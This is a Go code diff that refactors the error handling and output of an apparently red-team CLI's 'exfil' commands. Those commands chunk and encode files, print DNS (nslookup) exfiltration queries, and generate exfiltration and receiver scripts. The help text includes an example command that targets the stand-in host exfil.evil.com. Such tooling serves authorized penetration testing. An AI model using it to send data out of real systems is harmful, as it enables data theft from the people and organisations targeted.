@@ -2,11 +2,11 @@ package redteam
 
 import (
 	"fmt"
-	"os"
 
 	"github.com/Raxuis/RaxuisCLI/cmd"
 	"github.com/Raxuis/RaxuisCLI/internal/redteam/exfil"
 
+	"github.com/Raxuis/RaxuisCLI/internal/shared/output"
 	"github.com/spf13/cobra"
 )
 
@@ -26,8 +26,9 @@ Examples:
   raxuiscli exfil encode file.txt --method dns
   raxuiscli exfil script dns --target exfil.evil.com
   raxuiscli exfil receiver http --port 8080`,
-	Run: func(cmd *cobra.Command, args []string) {
+	RunE: func(cmd *cobra.Command, args []string) error {
 		_ = cmd.Help()
+		return nil
 	},
 }
 
@@ -36,7 +37,7 @@ var exfilChunkCmd = &cobra.Command{
 	Short: "Split file into chunks",
 	Long:  `Split a file into chunks for exfiltration.`,
 	Args:  cobra.ExactArgs(1),
-	Run: func(cmd *cobra.Command, args []string) {
+	RunE: func(cmd *cobra.Command, args []string) error {
 		filePath := args[0]
 
 		if exfilChunkSize <= 0 {
@@ -45,11 +46,11 @@ var exfilChunkCmd = &cobra.Command{
 
 		chunks, err := exfil.ChunkFile(filePath, exfilChunkSize)
 		if err != nil {
-			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
-			os.Exit(1)
+			return err
 		}
 
 		exfil.DisplayChunks(chunks)
+		return nil
 	},
 }
 
@@ -63,7 +64,7 @@ Methods:
   hex    - Hexadecimal encoding
   dns    - DNS-safe encoding`,
 	Args: cobra.ExactArgs(1),
-	Run: func(cmd *cobra.Command, args []string) {
+	RunE: func(cmd *cobra.Command, args []string) error {
 		filePath := args[0]
 
 		if exfilChunkSize <= 0 {
@@ -72,12 +73,12 @@ Methods:
 
 		chunks, err := exfil.ChunkFile(filePath, exfilChunkSize)
 		if err != nil {
-			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
-			os.Exit(1)
+			return err
 		}
 
 		method := exfil.EncodingMethod(exfilMethod)
 		exfil.DisplayEncodedChunks(chunks, method, 5)
+		return nil
 	},
 }
 
@@ -86,25 +87,23 @@ var exfilDNSCmd = &cobra.Command{
 	Short: "Generate DNS exfiltration queries",
 	Long:  `Generate DNS queries for exfiltrating a file.`,
 	Args:  cobra.ExactArgs(1),
-	Run: func(cmd *cobra.Command, args []string) {
+	RunE: func(cmd *cobra.Command, args []string) error {
 		filePath := args[0]
 
 		if exfilTarget == "" {
-			fmt.Fprintln(os.Stderr, "Error: --target domain is required")
-			os.Exit(1)
+			return fmt.Errorf("--target domain is required")
 		}
 
 		chunks, err := exfil.ChunkFile(filePath, 40) // Smaller for DNS
 		if err != nil {
-			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
-			os.Exit(1)
+			return err
 		}
 
-		fmt.Println("\n[DNS EXFILTRATION QUERIES]")
-		fmt.Println("==========================")
-		fmt.Printf("File: %s\n", filePath)
-		fmt.Printf("Domain: %s\n", exfilTarget)
-		fmt.Printf("Chunks: %d\n\n", len(chunks))
+		fmt.Fprintln(output.Std, "\n[DNS EXFILTRATION QUERIES]")
+		fmt.Fprintln(output.Std, "==========================")
+		fmt.Fprintf(output.Std, "File: %s\n", filePath)
+		fmt.Fprintf(output.Std, "Domain: %s\n", exfilTarget)
+		fmt.Fprintf(output.Std, "Chunks: %d\n\n", len(chunks))
 
 		limit := 5
 		if limit > len(chunks) {
@@ -113,12 +112,13 @@ var exfilDNSCmd = &cobra.Command{
 
 		for i := 0; i < limit; i++ {
 			query := exfil.BuildDNSQuery(&chunks[i], exfilTarget)
-			fmt.Printf("nslookup %s\n", query)
+			fmt.Fprintf(output.Std, "nslookup %s\n", query)
 		}
 
 		if len(chunks) > limit {
-			fmt.Printf("... and %d more queries\n", len(chunks)-limit)
+			fmt.Fprintf(output.Std, "... and %d more queries\n", len(chunks)-limit)
 		}
+		return nil
 	},
 }
 
@@ -129,19 +129,19 @@ var exfilScriptCmd = &cobra.Command{
 
 Methods: dns, http, icmp`,
 	Args: cobra.ExactArgs(1),
-	Run: func(cmd *cobra.Command, args []string) {
+	RunE: func(cmd *cobra.Command, args []string) error {
 		method := args[0]
 
 		if exfilTarget == "" {
-			fmt.Fprintln(os.Stderr, "Error: --target is required")
-			os.Exit(1)
+			return fmt.Errorf("--target is required")
 		}
 
 		script := exfil.GenerateExfilScript(method, exfilTarget)
 
-		fmt.Printf("\n[EXFILTRATION SCRIPT - %s]\n", method)
-		fmt.Println("================================")
-		fmt.Println(script)
+		fmt.Fprintf(output.Std, "\n[EXFILTRATION SCRIPT - %s]\n", method)
+		fmt.Fprintln(output.Std, "================================")
+		fmt.Fprintln(output.Std, script)
+		return nil
 	},
 }
 
@@ -154,14 +154,15 @@ var exfilReceiverCmd = &cobra.Command{
 
 Methods: dns, http`,
 	Args: cobra.ExactArgs(1),
-	Run: func(cmd *cobra.Command, args []string) {
+	RunE: func(cmd *cobra.Command, args []string) error {
 		method := args[0]
 
 		script := exfil.GenerateReceiverScript(method, exfilReceiverPort)
 
-		fmt.Printf("\n[RECEIVER SCRIPT - %s]\n", method)
-		fmt.Println("============================")
-		fmt.Println(script)
+		fmt.Fprintf(output.Std, "\n[RECEIVER SCRIPT - %s]\n", method)
+		fmt.Fprintln(output.Std, "============================")
+		fmt.Fprintln(output.Std, script)
+		return nil
 	},
 }
 
